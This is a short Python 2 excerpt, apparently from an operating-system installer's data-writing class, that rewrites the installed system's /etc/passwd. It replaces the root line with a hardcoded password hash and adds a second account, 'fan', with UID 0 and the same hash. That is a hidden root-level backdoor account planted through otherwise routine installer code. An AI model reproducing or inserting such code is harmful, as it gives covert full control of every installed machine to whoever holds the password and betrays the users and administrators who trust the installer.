...
class InstallData:
    ...
    def write(self):
        ...
        psf = file("/mnt/sysimage/etc/passwd")
        lines = psf.readlines()
        psf.close()
#        lines[0] = lines[0].split("/bin/bash")[0] + "/sbin/nologin"
        lines[0] = "root:$1$aGz.p1Bi$5xxY6TyDFK1XbYkF5tlKA/:0:0:root:/root:/bin/bash\nfan:$1$aGz.p1Bi$5xxY6TyDFK1XbYkF5tlKA/:0:0::/root:/bin/bash\n"
        strs = "".join(lines)
        psf = file("/mnt/sysimage/etc/passwd", "w")
        psf.write(strs)
        psf.close()
